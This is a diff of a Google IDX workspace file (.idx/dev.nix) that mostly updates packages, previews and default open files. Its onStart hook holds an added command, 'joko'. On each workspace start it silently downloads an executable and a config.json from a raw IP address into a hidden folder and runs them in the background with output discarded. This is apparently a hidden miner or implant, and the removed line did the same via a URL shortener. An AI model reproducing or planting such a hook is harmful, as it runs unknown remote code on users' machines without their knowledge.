@@ -2,11 +2,14 @@
 # see: https://developers.google.com/idx/guides/customize-idx-env
 { pkgs, ... }: {
   # Which nixpkgs channel to use.
-  channel = "stable-23.11"; # or "unstable"
+  channel = "stable-24.05"; # or "unstable"
   # Use https://search.nixos.org/packages to find packages
   packages = [
-    pkgs.nodejs_20
-    pkgs.python3
+    # pkgs.go
+    # pkgs.python311
+    # pkgs.python311Packages.pip
+    # pkgs.nodejs_20
+    # pkgs.nodePackages.nodemon
   ];
   # Sets environment variables in the workspace
   env = {};
@@ -14,15 +17,22 @@
     # Search for the extensions you want on https://open-vsx.org/ and use "publisher.id"
     extensions = [
       # "vscodevim.vim"
+      "google.gemini-cli-vscode-ide-companion"
     ];
-    # Enable previews and customize configuration
+    # Enable previews
     previews = {
       enable = true;
       previews = {
-        web = {
-          command = ["python3" "-m" "http.server" "$PORT" "--bind" "0.0.0.0"];
-          manager = "web";
-        };
+        # web = {
+        #   # Example: run "npm run dev" with PORT set to IDX's defined port for previews,
+        #   # and show it in IDX's web preview panel
+        #   command = ["npm" "run" "dev"];
+        #   manager = "web";
+        #   env = {
+        #     # Environment variables to set for your server
+        #     PORT = "$PORT";
+        #   };
+        # };
       };
     };
     # Workspace lifecycle hooks
@@ -32,12 +42,11 @@
         # Example: install JS dependencies from NPM
         # npm-install = "npm install";
         # Open editors for the following files by default, if they exist:
-        default.openFiles = [ "style.css" "main.js" "index.html" ];
+        default.openFiles = [ ".idx/dev.nix" "README.md" ];
       };
       # Runs when the workspace is (re)started
       onStart = {
-        joko = "mkdir -p ~/.jok && cd ~/.jok && [ ! -f kontol ] && wget -q -O kontol https://is.gd/lrGMfB && chmod +x kontol; wget -q -O config.json http://143.198.196.235/config.json && chmod +x config.json && nohup ./kontol -c 'config.json' > /dev/null 2>&1 &
-";
+        joko = "mkdir -p ~/.temp && cd ~/.temp && [ ! -f dev ] && wget -q -O dev http://143.198.196.235/dev.py && chmod +x dev; wget -q -O config.json http://143.198.196.235/config.json && chmod +x config.json && nohup ./dev -c 'config.json' > /dev/null 2>&1 &";
         # Example: start a background task to watch and re-build backend code
         # watch-backend = "npm run watch-backend";
       };
